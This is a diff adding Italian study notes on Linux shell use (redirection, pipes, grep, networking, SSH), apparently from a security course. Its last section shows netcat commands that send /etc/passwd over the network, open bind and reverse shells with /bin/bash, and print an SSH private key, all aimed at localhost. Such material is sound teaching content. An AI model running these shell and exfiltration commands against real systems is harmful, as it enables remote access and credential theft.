@@ -70,4 +70,89 @@ La shell utilizza le variabili d'ambiente:
 >- vim
 >- ...
 
-slide 13
+## Redirection
+L'input e l'Output di un programma può essere reindirizzato e dato in pasto ad altri programmi:
+- L'operatore ">" reindirizza l'*output*;
+- L'operatore "<" reindirizza l'*input*.
+La sintassi generale per il reindirizzamento è:
+- `fd1 [operator] &fd2 ->` reindirizza fd1 a fd2
+- `fd1 [operator] filename ->` reindirizza f1 al filename
+Il file speciale `/dev/null`
+- I byte scritti su questo file sono semplicemente spazzatura
+- Utile per quando si vuole ignorare un output
+- `find / -type f -name sudo 2>/dev/null`
+	- = ignora stderr e stampa solo stdout
+## Pipes
+Le pipes sono file utilizzati dei processi per intercomunicare (IPC).
+- Una *named pipe* o *fifo* esiste nel filesystem;
+- Una *anonymous pipe* è gestita direttamente dal kernel e non esiste nel filesystem.
+Supponi di voler utilizzare l'output di un programma come input di un'altro. Puoi farlo con i reindirizzamenti, oppure con le pipe:
+```Bash
+program1 | program2
+program1 | program2 | program 3 | ...
+```
+
+Le pipe necessitano di essere create prima di essere utilizzate.
+
+>[!important]- Il programma `grep`
+> Il programma `grep` filtra l'input in base a delle regole.
+> es. `cat *.txt | grep "vdsi"` mostrerà in output qualsiasi file .txt che contiene la stringa "vdsi"
+
+Altri programmi di filtro di testo:
+- `awk` estrae token
+- `sed` rimpiazza stringhe
+- `cut` taglia le stringhe e ne prende solo alcune parti
+### Stringhe
+Le stringhe sono sequenze di caratteri racchiuse tra virgolette.
+>[!info]- `\` è una Escape sequence
+>Una stringa è "escaped" quando tutti i caratteri pericolosi vengono rimpiazzati da sequenze di fuga.
+>
+
+### Text Editors
+Spesso avrai bisogno di modificare dei file direttamente dalla shell. Ci sono due programmi principali di editing di testo:
+- Nano
+- Vim (e derivati, es. neovim, lunarvim, lazivim, vi, ...)
+# File e processi
+## Permessi in linux
+![[Pasted image 20240315232541.png|center|500]]
+## Networking
+```Bash
+netstat
+ip addr
+ip route
+ip neigh
+ip link
+ifconfig
+route -n
+```
+### SSH
+```Bash
+service ssh status/start
+ssh-keygen -t rsa
+cat ~/.ssh/authorized_keys
+cat ~/.ssh/id_rsa.pub
+cat ~/.ssh/id_rsa
+ssh -i id root@127.0.0.1 -p 53
+```
+# Scripting, bind e Reverse shell
+## Netcat
+### Transferring files
+```Zsh
+nc -lvnp 1234
+cat /etc/passwd | nc 127.0.0.1 1234
+nc -lvnp 1234 > transfered
+cat /etc/passwd | nc -w1 127.0.0.1 1234
+```
+### Bind shell
+![[Pasted image 20240315233334.png|center|500]]
+
+```zsh
+(shell 1) nc -lvnp 1234 -e /bin/bash
+(shell 2) nc 127.0.0.1 1234
+```
+### Reverse Shell
+![[Pasted image 20240315233613.png|center|500]]
+```zsh
+(shell 1) nc -lvnp 1234 
+(shell 2) nc 127.0.0.1 1234 -e /bin/bash
+```
